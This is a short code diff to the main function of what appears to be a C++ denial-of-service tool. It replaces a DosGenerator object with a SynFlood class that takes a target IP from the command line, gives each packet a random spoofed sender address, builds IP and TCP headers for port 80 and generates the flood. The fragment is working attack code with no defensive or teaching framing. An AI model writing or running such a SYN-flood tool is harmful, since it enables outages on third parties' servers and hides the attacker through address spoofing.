@@ -14,24 +14,26 @@ int main(int argc, char* argv[])
 
     if(argc != 3) usage();
 
-    DosGenerator dosGenerator;
+//    DosGenerator synFlood;
+    SynFlood synFlood;
 
 //    init pcd for send packet
-//    dosGenerator.pcd_init(argv[1]);
+//    synFlood.pcd_init(argv[1]);
 
-    dosGenerator.raw_init();
+    synFlood.raw_init();
+    synFlood.raw_init();
 
     //set target ip to argv[2]
-    dosGenerator.target_ip_=argv[2];
+    synFlood.target_ip_=argv[2];
     //set sender ip random
-    dosGenerator.sender_ip_.set_rand_ip();
+    synFlood.sender_ip_.set_rand_ip();
 
     //set ip header
-    dosGenerator.init_iph(dosGenerator.sender_ip_,dosGenerator.target_ip_);
-    dosGenerator.init_tcph(1234,80);
+    synFlood.init_iph(synFlood.sender_ip_,synFlood.target_ip_);
+    synFlood.init_tcph(1234,80);
 
 
-    dosGenerator.generate();
+    synFlood.generate();
 
 
     return 0;
